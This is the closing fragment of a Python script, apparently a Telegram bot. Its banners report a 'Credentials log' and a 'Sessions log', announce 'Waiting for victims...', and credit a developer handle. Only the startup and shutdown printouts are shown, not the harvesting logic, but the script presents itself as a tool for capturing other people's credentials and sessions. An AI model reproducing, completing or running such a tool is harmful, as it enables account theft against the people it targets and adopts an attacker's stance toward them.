print(f"{CYAN}📁 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗹𝗼𝗴: {credentials_log}{END}")
print(f"{CYAN}📁 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 𝗹𝗼𝗴: {session_log}{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
print(f"{YELLOW}⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴 𝗳𝗼𝗿 𝘃𝗶𝗰𝘁𝗶𝗺𝘀...{END}")
print(f"{RED}🛑 𝗣𝗿𝗲𝘀𝘀 𝗖𝘁𝗿𝗹+𝗖 𝘁𝗼 𝘀𝘁𝗼𝗽{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}\n")

try:
    bot.polling(none_stop=True)
except KeyboardInterrupt:
    print(f"\n{RED}{BOLD}🛑 𝗕𝗢𝗧 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗕𝗬 𝗨𝗦𝗘𝗥{END}")
    print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
    print(f"{CYAN}📁 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗹𝗼𝗴: {credentials_log}{END}")
    print(f"{CYAN}📁 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 𝗹𝗼𝗴: {session_log}{END}")
    print(f"{YELLOW}👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @IshrakShadman{END}")
    print(f"{YELLOW}📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @IshrakShadman{END}")
    print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
    sys.exit(0)
except Exception as e:
    print(f"\n{RED}❌ 𝗘𝗿𝗿𝗼𝗿: {e}{END}")
    print(f"{YELLOW}🔄 𝗥𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗯𝗼𝘁 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲{END}")